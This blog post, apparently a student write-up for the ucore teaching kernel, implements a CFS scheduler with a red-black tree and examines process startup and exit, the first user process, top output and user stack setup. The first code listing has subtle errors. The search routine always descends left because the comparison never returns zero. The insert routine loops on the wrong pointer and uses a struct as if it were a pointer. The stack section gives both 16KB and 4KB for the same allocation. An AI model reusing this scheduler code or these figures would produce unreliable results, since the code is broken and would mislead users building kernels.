<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare_cfs_node</span><span class="params">(struct proc_struct *a, struct proc_struct *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a-&gt;vruntime != b-&gt;vruntime)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (a-&gt;vruntime &gt; b-&gt;vruntime)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (a-&gt;pid &gt; b-&gt;pid)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">struct cfs_node *<span class="title">cfs_search</span><span class="params">(struct rb_root *root, struct proc_struct *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">node</span> =</span> root-&gt;rb_node;</span><br><span class="line">  <span class="keyword">while</span> (node)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cfs_node</span> *<span class="title">data</span> =</span> container_of(node, struct cfs_node, node);</span><br><span class="line">    <span class="keyword">if</span> (data-&gt;proc-&gt;pid == proc-&gt;pid)</span><br><span class="line">      <span class="keyword">return</span> data;</span><br><span class="line">    <span class="keyword">if</span> (compare_cfs_node(data-&gt;proc, proc))</span><br><span class="line">      node = node-&gt;rb_left;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      node = node-&gt;rb_right;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cfs_insert</span><span class="params">(struct rb_root *root, struct proc_struct *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cfs_node</span> *<span class="title">data</span> =</span> (struct cfs_node *)kmalloc(<span class="keyword">sizeof</span>(struct cfs_node));</span><br><span class="line">  data-&gt;proc = proc;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> **<span class="title">new</span> =</span> &amp;(root-&gt;rb_node), *parent = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">/* Figure out where to put new node */</span> </span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">new</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cfs_node</span> <span class="title">this</span> =</span> container_of(<span class="keyword">new</span>, struct cfs_node, node);</span><br><span class="line">    <span class="keyword">int</span> result = compare_cfs_node(data-&gt;proc, <span class="keyword">this</span>-&gt;proc);</span><br><span class="line">    parent = *<span class="keyword">new</span>;</span><br><span class="line">    <span class="keyword">if</span> (result &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">new</span> = &amp;((*<span class="keyword">new</span>)-&gt;rb_left);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (result &gt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">new</span> = &amp;((*<span class="keyword">new</span>)-&gt;rb_right);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Add new node and rebalance tree. */</span></span><br><span class="line">  rb_link_node(&amp;data-&gt;node, parent, <span class="keyword">new</span>);</span><br><span class="line">  rb_insert_color(&amp;data-&gt;node, root);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">struct proc_struct *<span class="title">cfs_find_min</span><span class="params">(struct rb_root *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">node</span> =</span> root-&gt;rb_node;</span><br><span class="line">  <span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">while</span> (node-&gt;rb_left)</span><br><span class="line">    node = node-&gt;rb_left;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cfs_node</span> *<span class="title">data</span> =</span> container_of(node, struct cfs_node, node);</span><br><span class="line">  <span class="keyword">return</span> data-&gt;proc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cfs_node_free</span><span class="params">(struct cfs_node *node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (node != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  node-&gt;proc = <span class="literal">NULL</span>;</span><br><span class="line">  kfree(node);</span><br><span class="line">  node = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面开始实现CFS调度器</p>
<p>首先是调度器初始化函数, 初始化红黑树根节点，并设置调度队列里面的进程数量为0</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">cfs_init(struct run_queue *rq)</span><br><span class="line">&#123;</span><br><span class="line">  list_init(&amp;(rq-&gt;run_list));</span><br><span class="line">  rq-&gt;cfs_rb_tree = RB_ROOT;</span><br><span class="line">  rq-&gt;proc_num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后是插入进程，将进程插入红黑树，并且增加该进程里面的进程数量</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">cfs_enqueue(struct run_queue *rq, struct proc_struct *proc)</span><br><span class="line">&#123;</span><br><span class="line">  cfs_insert(&amp;(rq-&gt;cfs_rb_tree), proc);</span><br><span class="line">  <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice)</span><br><span class="line">    proc-&gt;time_slice = rq-&gt;max_time_slice;</span><br><span class="line">  proc-&gt;rq = rq;</span><br><span class="line">  rq-&gt;proc_num++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是把一个待运行的进程从运行队列里面出队，根据PCB找到CFS节点数据结构的位置。销毁创建的CFS节点，减少进程计数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">cfs_dequeue(struct run_queue *rq, struct proc_struct *proc)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cfs_node</span> *<span class="title">data</span> =</span> cfs_search(&amp;(rq-&gt;cfs_rb_tree), proc);</span><br><span class="line">  <span class="keyword">if</span> (data)</span><br><span class="line">  &#123;</span><br><span class="line">    rb_erase(&amp;data-&gt;node, &amp;(rq-&gt;cfs_rb_tree));</span><br><span class="line">    cfs_node_free(data);</span><br><span class="line">    rq-&gt;proc_num--;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是每一次时钟中断的调用，这里是我们实现的时候与 linux 实现不一样的地方。在标准linux 的实现中，若当前运行的 proc 的 vruntime 已经不是队列里面最小的了（实际上会导致频繁调度，所以一般设置一个阈值）超过这个限制会直接触发调度，但是我们为了简单和一定程度上的效率考虑只是通过 vruntime 进行选择，而不是使用 vruntime 进行抢占调度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">cfs_proc_tick(struct run_queue *rq, struct proc_struct *proc)</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;&#x2F; 实际上CFS的实现：若 proc-&gt;vruntime 已经不是队列里面最小的了（实际上会导致频繁调度，所以一般设置一个阈值）</span><br><span class="line">  &#x2F;&#x2F; 超过这个限制会直接触发调度</span><br><span class="line">  &#x2F;&#x2F; 此时的进程不在红黑树中，修改 proc-&gt;vruntime 不会破坏红黑树的性质。 但是还是需要完善上述 CFS</span><br><span class="line">  &#x2F;&#x2F; 仍有运行时间则减少其运行时间，计算虚拟运行时间</span><br><span class="line">  assert(proc-&gt;cfs_prior !&#x3D; 0);</span><br><span class="line">  proc-&gt;vruntime +&#x3D; proc-&gt;cfs_prior;</span><br><span class="line">  if (proc-&gt;time_slice &gt; 0)</span><br><span class="line">    proc-&gt;time_slice--;</span><br><span class="line">  &#x2F;&#x2F; 时间片用完则标记该进程需要调度</span><br><span class="line">  if (proc-&gt;time_slice &#x3D;&#x3D; 0)</span><br><span class="line">    proc-&gt;need_resched &#x3D; 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="对一些问题的研究"><a href="#对一些问题的研究" class="headerlink" title="对一些问题的研究"></a>对一些问题的研究</h2><h3 id="用户态进程是如何退出的"><a href="#用户态进程是如何退出的" class="headerlink" title="用户态进程是如何退出的"></a>用户态进程是如何退出的</h3><p>以 stackOverflow.c 这个程序为例, 在编译的时候总共涉及 gcc 的调用和 ld 的链接操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -Iuser&#x2F; -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs&#x2F; -Iuser&#x2F;include&#x2F; -Iuser&#x2F;libs&#x2F; -c user&#x2F;stackOverFlow.c -o obj&#x2F;user&#x2F;stackOverFlow.o</span><br><span class="line">ld -m    elf_i386 -nostdlib -T tools&#x2F;user.ld -o obj&#x2F;__user_stackOverFlow.out  obj&#x2F;user&#x2F;libs&#x2F;panic.o obj&#x2F;user&#x2F;libs&#x2F;syscall.o obj&#x2F;user&#x2F;libs&#x2F;ulib.o obj&#x2F;user&#x2F;libs&#x2F;semaphore.o obj&#x2F;user&#x2F;libs&#x2F;initcode.o obj&#x2F;user&#x2F;libs&#x2F;file.o obj&#x2F;user&#x2F;libs&#x2F;stdio.o obj&#x2F;user&#x2F;libs&#x2F;dir.o obj&#x2F;user&#x2F;libs&#x2F;umain.o obj&#x2F;user&#x2F;libs&#x2F;pthread.o obj&#x2F;user&#x2F;libs&#x2F;proc.o  obj&#x2F;libs&#x2F;rbtree.o obj&#x2F;libs&#x2F;string.o obj&#x2F;libs&#x2F;printfmt.o obj&#x2F;libs&#x2F;hash.o obj&#x2F;libs&#x2F;rand.o obj&#x2F;user&#x2F;stackOverFlow.o</span><br></pre></td></tr></table></figure>
<p>之所以选这个程序是因为简单，使用 objdump 反汇编第一条 gcc 编译指令执行完毕生成的 stackOverFlow.o 文件的 text 段如下所示：<br>注意现在还没有到链接的阶段，所有 text 段代码的起始位置都是 0 地址处：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line">00000000 &lt;loop&gt;:</span><br><span class="line">   0:    f3 0f 1e fb             endbr32</span><br><span class="line">   4:    55                      push   %ebp</span><br><span class="line">   5:    89 e5                   mov    %esp,%ebp</span><br><span class="line">   7:    83 ec 08                sub    $0x8,%esp</span><br><span class="line">   a:    e8 fc ff ff ff          call   b &lt;loop+0xb&gt;</span><br><span class="line">   f:    90                      nop</span><br><span class="line">  10:    c9                      leave</span><br><span class="line">  11:    c3                      ret</span><br><span class="line">00000012 &lt;main&gt;:</span><br><span class="line">  12:    f3 0f 1e fb             endbr32</span><br><span class="line">  16:    55                      push   %ebp</span><br><span class="line">  17:    89 e5                   mov    %esp,%ebp</span><br><span class="line">  19:    83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line">  1c:    e8 fc ff ff ff          call   1d &lt;main+0xb&gt;</span><br><span class="line">  21:    b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  26:    c9                      leave</span><br><span class="line">  27:    c3                      ret</span><br></pre></td></tr></table></figure>
<p>下一条链接指令会将 user/lib 下的所有 .o 文件与 stackOverFlow.o 一起进行链接操作<br>其中链接的 obj/user/libs/initcode.o 是一段汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">    # set ebp for backtrace</span><br><span class="line">    movl $0x0, %ebp</span><br><span class="line">    # load argc and argv</span><br><span class="line">    movl (%esp), %ebx</span><br><span class="line">    lea 0x4(%esp), %ecx</span><br><span class="line"></span><br><span class="line">    # move down the esp register</span><br><span class="line">    # since it may cause page fault in backtrace</span><br><span class="line">    subl $0x20, %esp</span><br><span class="line">    # save argc and argv on stack</span><br><span class="line">    pushl %ecx</span><br><span class="line">    pushl %ebx</span><br><span class="line">    # call user-program function</span><br><span class="line">    call umain</span><br><span class="line">1:  jmp 1b</span><br></pre></td></tr></table></figure>
<p>结合链接脚本中的<code>ENTRY(_start)</code>可知在链接完成后 initcode.o 是最先被执行的，该段汇编指令调用了 umain 函数，定义在 umain.o 里。<br>umain 打开了输入输出流两个文件描述符，并调用函数 main （注意：umain 上面的 main 函数只是声明，在链接的时候会把 stackOverFlow.o 里面的 main 函数实现给链接上，<strong>main 函数执行完成后 umain 调用系统调用 exit 退出</strong>）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char *argv[]);</span><br><span class="line">static int</span><br><span class="line">initfd(int fd2, const char *path, uint32_t open_flags) &#123;</span><br><span class="line">    int fd1, ret;</span><br><span class="line">    if ((fd1 &#x3D; open(path, open_flags)) &lt; 0) &#123;</span><br><span class="line">        return fd1;</span><br><span class="line">    &#125;</span><br><span class="line">    if (fd1 !&#x3D; fd2) &#123;</span><br><span class="line">        close(fd2);</span><br><span class="line">        ret &#x3D; dup2(fd1, fd2);</span><br><span class="line">        close(fd1);</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line">void</span><br><span class="line">umain(int argc, char *argv[]) &#123;</span><br><span class="line">    int fd;</span><br><span class="line">    if ((fd &#x3D; initfd(0, &quot;stdin:&quot;, O_RDONLY)) &lt; 0) &#123;</span><br><span class="line">        warn(&quot;open &lt;stdin&gt; failed: %e.\n&quot;, fd);</span><br><span class="line">    &#125;</span><br><span class="line">    if ((fd &#x3D; initfd(1, &quot;stdout:&quot;, O_WRONLY)) &lt; 0) &#123;</span><br><span class="line">        warn(&quot;open &lt;stdout&gt; failed: %e.\n&quot;, fd);</span><br><span class="line">    &#125;</span><br><span class="line">    int ret &#x3D; main(argc, argv);</span><br><span class="line">    exit(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>截取几段链接完成后的反汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line">00800020 &lt;__panic&gt;:</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;ulib.h&gt;</span><br><span class="line">#include &lt;error.h&gt;</span><br><span class="line">void</span><br><span class="line">__panic(const char *file, int line, const char *fmt, ...) &#123;</span><br><span class="line">  800020:    f3 0f 1e fb             endbr32</span><br><span class="line">  800024:    55                      push   %ebp</span><br><span class="line">  800025:    89 e5                   mov    %esp,%ebp</span><br><span class="line">  800027:    83 ec 18                sub    $0x18,%esp</span><br></pre></td></tr></table></figure>
<p>可以看到代码段真如 ld 脚本规定的从 0x00800020 地址处开始</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0080066b &lt;_start&gt;:</span><br><span class="line">.text</span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">    # set ebp for backtrace</span><br><span class="line">    movl $0x0, %ebp</span><br><span class="line">  80066b:    bd 00 00 00 00          mov    $0x0,%ebp</span><br><span class="line">    # load argc and argv</span><br><span class="line">    movl (%esp), %ebx</span><br><span class="line">  800670:    8b 1c 24                mov    (%esp),%ebx</span><br><span class="line">    lea 0x4(%esp), %ecx</span><br><span class="line">  800673:    8d 4c 24 04             lea    0x4(%esp),%ecx</span><br></pre></td></tr></table></figure>
<p>最后操作系统在执行这段代码的时候会根据 elf 的格式将 eip 设置为 0x0080066b 从这开始执行。</p>
<h3 id="为何代码不从-0-地址开始"><a href="#为何代码不从-0-地址开始" class="headerlink" title="为何代码不从 0 地址开始"></a>为何代码不从 0 地址开始</h3><p>The stack, which is usually quite small but could grow quite dramatically in some occasions. The stack grows down, and when the stack is full, we really want the process to predictably crash rather than overwriting some data. So there had to be a wide area for the stack, with, at the low end of that area, an unmapped page. And lo! There is an unmapped page at address zero, to catch null pointer dereferences. Hence it was defined that the stack would get the first 128 MB of address space, except for the first page. This means that the code had to go after those 128 MB, at an address similar to 0x080xxxxx.</p>
<p>As Michael points out, “losing” 128 MB of address space was no big deal because the address space was very large with regards to what could be actually used. At that time, the Linux kernel was limiting the address space for a single process to 1 GB, over a maximum of 4 GB allowed by the hardware, and that was not considered to be a big issue.</p>
<h3 id="第一个用户进程-sh"><a href="#第一个用户进程-sh" class="headerlink" title="第一个用户进程 sh"></a>第一个用户进程 sh</h3><p>第一个用户进程是从<code>int pid = kernel_thread(user_main, NULL, 0);</code>而来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">kernel_thread(int (*fn)(void *), void *arg, uint32_t clone_flags) &#123;</span><br><span class="line">    struct trapframe tf;</span><br><span class="line">    memset(&amp;tf, 0, sizeof(struct trapframe));</span><br><span class="line">    tf.tf_cs &#x3D; KERNEL_CS;</span><br><span class="line">    tf.tf_ds &#x3D; tf.tf_es &#x3D; tf.tf_ss &#x3D; KERNEL_DS;</span><br><span class="line">    tf.tf_regs.reg_ebx &#x3D; (uint32_t)fn;</span><br><span class="line">    tf.tf_regs.reg_edx &#x3D; (uint32_t)arg;</span><br><span class="line">    tf.tf_eip &#x3D; (uint32_t)kernel_thread_entry;</span><br><span class="line">    return do_fork(clone_flags | CLONE_VM, 0, &amp;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>送了这个即将执行的 user_main 函数一个内核栈帧和一个 kernel_thread_entry 函数（该函数定义 user_main 执行完成后会自动调用 do_wait） 然后就把 user_main 进程给 fork 出来了（此时还在内核态）。<br>最后 user_main 进程执行了 user_main 函数，引发一个中断调用 exec，把这个进程掏空，该进程变成了进程 sh ，注意在从文件系统载入代码的 load_icode 函数中，在中断栈帧中把 user_main 的段子换成了用户态的段子，只要中断一返回，该进程回到了用户态</p>
<p>虽然上面定义了 user_main 执行完成后会自动调用 do_wait ，但一个 exec 调用过后， eip 指针的值已经被修改，sh 已经和 kernel_thread_entry 没关系了。 所以最后 sh 若要退出需要通过中断调用（用户进程也没法直接执行 do_wait）, 具体如何进行的中断调用仍需要研究。</p>
<h3 id="对-top-指令的结果分析"><a href="#对-top-指令的结果分析" class="headerlink" title="对 top 指令的结果分析"></a>对 top 指令的结果分析</h3><p><img src="https://uploader.shimo.im/f/DlKvoeiCUVwBtK9l.png!thumbnail?fileGuid=ZzkLVnaGVeiM443Q" alt="图片"></p>
<p>进程数量等于 os 内的全局变量 nr_process 这个变量包含了 idle 进程所以总共 4 个没问题。</p>
<p>init 进程从其创建，第一次执行 do_wait 的时候，就因为其有 user_main（该进程创造 sh 后结束） 这个进程而陷入了 sleep ，只要其子进程（sh）不死（就是变 Zombie，sleep 都没用），永远不会唤醒该 init 进程来回收资源（其他父线程托孤的时候可能唤醒 init）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">while (do_wait(0, NULL) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">    schedule();</span><br><span class="line">&#125;</span><br><span class="line">if (haskid) &#123;</span><br><span class="line">    current-&gt;state &#x3D; PROC_SLEEPING;</span><br><span class="line">    current-&gt;wait_state &#x3D; WT_CHILD;</span><br><span class="line">    schedule();</span><br><span class="line">    if (current-&gt;flags &amp; PF_EXITING) &#123;</span><br><span class="line">        do_exit(-E_KILLED);</span><br><span class="line">    &#125;</span><br><span class="line">    goto repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>idle 的调度是被特判过的, 运行队列里面没有 idleproc ， OS 在没有进程可供调度的时候选择进程 idleproc，自然其 vruntime 不会被计算</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">sched_class_proc_tick(struct proc_struct *proc) &#123;</span><br><span class="line">    if (proc !&#x3D; idleproc) &#123;</span><br><span class="line">        sched_class-&gt;proc_tick(rq, proc);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        proc-&gt;need_resched &#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sh 是在等待输入的函数<code>dev_stdin_read</code>主动调用<code>schedule()</code>放弃时间片，所以 在间隔两次输入<code>top</code>指令的中间，sh 一直在等待输入，并没有被调度，所以两次间隔后 idle 的调度次数会巨多因为除了 idle ，ucore 没有其他进程可供调度，但 vruntime 是 0（因为特判），sh 的 vruntime 可能会有小幅 提升因为调用了 top ，中间处理会给 sh 时间，但一旦 top 开始执行， sh 又会因为等 top 执行完毕被挂起，top 执行完成后又在等输入。。。。</p>
<h3 id="对用户栈的研究"><a href="#对用户栈的研究" class="headerlink" title="对用户栈的研究"></a>对用户栈的研究</h3><p>每个用户进程都设置了用户栈为，栈顶是 USTACKTOP - 1 （第一个地址不是），栈大小是 USTACKSIZE 。调用 mm_mmap 函数建立用户栈的 vma 结构，明确用户栈的位置在用户虚空间的顶端，大小为 256 个页，即 1MB。但这个只是设置了 vma 。下面调用 pgdir_alloc_page 分配了 4 页（16KB）的栈空间给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vm_flags &#x3D; VM_READ | VM_WRITE | VM_STACK;</span><br><span class="line">if ((ret &#x3D; mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, NULL)) !&#x3D; 0) &#123;</span><br><span class="line">    goto bad_cleanup_mmap;</span><br><span class="line">&#125;</span><br><span class="line">assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) !&#x3D; NULL);</span><br><span class="line">assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-2*PGSIZE , PTE_USER) !&#x3D; NULL);</span><br><span class="line">assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-3*PGSIZE , PTE_USER) !&#x3D; NULL);</span><br><span class="line">assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-4*PGSIZE , PTE_USER) !&#x3D; NULL);</span><br></pre></td></tr></table></figure>
<p>一旦这 4KB 的栈被用完了，那么就会引起缺页异常。</p>
